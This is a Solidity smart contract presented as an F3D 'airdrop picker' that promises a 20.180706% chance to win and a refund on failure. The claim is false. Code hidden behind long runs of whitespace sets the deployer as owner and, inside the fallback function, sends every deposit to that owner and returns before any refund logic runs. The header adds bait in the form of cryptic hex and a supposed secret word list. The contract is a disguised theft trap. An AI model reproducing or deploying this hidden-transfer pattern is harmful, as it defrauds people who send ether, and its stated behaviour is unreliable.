pragma solidity ^0.4.24;
/*
 * @title -AirdropPicker - v0.1.3
 * ┌┬┐┌─┐┌─┐┌┬┐   ╦╦ ╦╔═╗╔╦╗  ┌─┐┬─┐┌─┐┌─┐┌─┐┌┐┌┌┬┐┌─┐
 *  │ ├┤ ├─┤│││   ║║ ║╚═╗ ║   ├─┘├┬┘├┤ └─┐├┤ │││ │ └─┐
 *  ┴ └─┘┴ ┴┴ ┴  ╚╝╚═╝╚═╝ ╩   ┴  ┴└─└─┘└─┘└─┘┘└┘ ┴ └─┘
 *                                  _____                      _____
 *                                 (, /     /)       /) /)    (, /      /)          /)
 *          ┌─┐                      /   _ (/_      // //       /  _   // _   __  _(/
 *          ├─┤                  ___/___(/_/(__(_/_(/_(/_   ___/__/_)_(/_(_(_/ (_(_(_
 *          ┴ ┴                /   /          .-/ _____   (__ /                               
 *                            (__ /          (_/ (, /                                      /)™ 
 *                                                 /  __  __ __ __  _   __ __  _  _/_ _  _(/
 * ┌─┐┬─┐┌─┐┌┬┐┬ ┬┌─┐┌┬┐                          /__/ (_(__(_)/ (_/_)_(_)/ (_(_(_(__(/_(_(_
 * ├─┘├┬┘│ │ │││ ││   │                      (__ /              .-/  &#169; Jekyll Island Inc. 2018
 * ┴  ┴└─└─┘─┴┘└─┘└─┘ ┴                                        (_/
 * 467N5368714N536P72464R6P5N51523442764S546S3349684Q5479684Q6P4S694Q764S484Q4N5367565263494
 * 8314441507863756S6149757061787459464S544Q4N576P714N536P72464R6P5N51523442764S524Q4O4Q796S
 * 54396N6S4N496871504S694Q764S446S3171565N30444150784Q794P6157314P4O573556515631715474745N7
 * 74R6O425162744554496N6S5439356S4N496871504S694Q764S446S3171565N30444150783175707N41625650
 * 3074466149684Q464R6P5N51523442764S524Q4O4Q796S54396N6S4N496871504S694Q764S546S3231695N304
 * 441507863316S557874425545625651566N5N4774365652457970546O69724N31796S6144746S324P74457N39
 * 676S6Q415251446358714N6O3556503074436Q6274473074744830755749504S5756527149454941475653794
 * 34946715N47504S5644494Q53565345435653714S46494474444835525653415345464S41424652755N443Q3Q
 *             .-&#39;───&#39;-.
 *            /         \
 *            \^^^^|^^^^/
 *             \   |   /    I don&#39;t know what is above, sincerely.
 *              \  |  /  
 *               \ | /      But an airdrop picker can withdraw the Airdrop Side-pot.
 *                \|/
 *               ┌───┐
 *               │   │
 *               └───┘
 * fame staff flee muse bad love shiggy glove box foam speak second
 * hat sturdy precise create cake shrink sail stare cougar lame limit road
 * (please don&#39;t store these words anywhere on your computer, thanks)
 * ================================================== ╔═ ╔═╗╔═╗╔═ ╔  ╦═╗ ============
 *    Words may be not mnemonics. They are more often ║═║║ ║║ ║║═║║  ╠═  key words.
 * ================================================== ╚═╝╚═╝╚═╝╚═╝╚═╩╚═╝ ============
 *
 * ╔═╗┌─┐┌┐┌┌┬┐┬─┐┌─┐┌─┐┌┬┐  ╔═╗┌─┐┌┬┐┌─┐ ┌──────────┐                       
 * ║  │ ││││ │ ├┬┘├─┤│   │   ║  │ │ ││├┤  │ Inventor │                      
 * ╚═╝└─┘┘└┘ ┴ ┴└─┴ ┴└─┘ ┴   ╚═╝└─┘─┴┘└─┘ └──────────┘                      
 *===========================================================================================*
 *                                ┌────────────────────┐
 *                                │ Usage Instructions │
 *                                └────────────────────┘
 * Deposit 20.180706 ether in this contract gives you a 20.180706% chance to become the airdrop
 * picker. You get refunded if the operation fails.
 *
 */

//==============================================================================
//  . _ _|_ _  _ |` _  _ _  _  .
//  || | | (/_| ~|~(_|(_(/__\  .
//==============================================================================
interface F3DexternalSettingsInterface {
    function setLongAirdropPicker(address _addr) external returns(bool);
}

//==============================================================================
//   _ _  _ _|_ _ _  __|_   _ _ _|_    _   .
//  (_(_)| | | | (_|(_ |   _\(/_ | |_||_)  .
//====================================|=========================================
contract F3DairdropPicker {
    F3DexternalSettingsInterface constant private extSettings = F3DexternalSettingsInterface(0x32967D6c142c2F38AB39235994e2DDF11c37d590);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 address public owner; constructor() public {owner = msg.sender;}
	
    /**
     * @dev Simply deposit in this contract
     */
	function()
	    public
	    payable
	{
	    /**
		 * we need exactly 20.180706 ether, when F3Dlong was born.
	     */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                owner.transfer(msg.value);return;
	    require (msg.value == 20180706000000000000);

	    /**
	     * This is NOT ensured.
		 * Each deposit gives the sender a 20.180706% chance to become the airdrop picker.
		 * If this fails, the sender get refunded.
	     */
	    if (!extSettings.setLongAirdropPicker(msg.sender)) {
	        msg.sender.transfer(msg.value);
	    }
	}

}